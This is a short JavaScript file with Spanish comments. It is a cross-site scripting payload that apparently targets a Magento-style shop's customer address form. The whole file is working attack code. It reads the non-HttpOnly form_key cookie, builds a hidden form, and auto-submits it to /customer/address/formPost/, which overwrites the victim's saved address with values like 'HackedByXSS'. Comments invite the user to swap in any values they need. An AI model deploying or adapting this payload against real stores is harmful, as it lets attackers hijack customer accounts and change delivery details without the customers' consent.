// xss-edit-address.js

// Función para leer cookies (form_key no es HttpOnly)
function getCookie(name) {
  let matches = document.cookie.match(new RegExp(
    "(?:^|; )" + name.replace(/([.$?*|{}\\(\\)[\\]\\\\\\/\\+^])/g, '\\$1') + "=([^;]*)"
  ));
  return matches ? decodeURIComponent(matches[1]) : null;
}

let formKey = getCookie('form_key');

if (formKey) {
  // Crear formulario invisible
  let form = document.createElement('form');
  form.method = 'POST';
  form.action = '/customer/address/formPost/';

  // Función helper para agregar campos hidden
  function addField(name, value) {
    let input = document.createElement('input');
    input.type = 'hidden';
    input.name = name;
    input.value = value;
    form.appendChild(input);
  }

  // Agrega el form_key (lo leemos de la cookie)
  addField('form_key', formKey);

  // Campos que quieres modificar (cámbialos a lo que necesites)
  addField('firstname', 'HackedByXSS');
  addField('lastname', 'Pwned');
  addField('company', 'Owned via XSS');
  addField('telephone', '+41 666 666 666');
  addField('street[]', 'Calle Inyectada 666');
  addField('street[]', 'Piso 13');           // puedes agregar varios street[]
  addField('city', 'Ciudad Hackeada');
  addField('postcode', '9999');
  addField('country_id', 'CH');

  // Opcional: success_url y error_url para que redirija bien
  addField('success_url', '/customer/address/');
  addField('error_url', '/customer/address/edit/');

  // Agregar al DOM y enviar automáticamente
  document.body.appendChild(form);
  form.submit();

  // Opcional: mostrar algo para confirmar (solo si quieres debug)
  // alert('Intentando editar dirección...');
} else {
  // Si no hay form_key, no hacemos nada o mostramos error (debug)
  // console.log('No se encontró form_key');
}
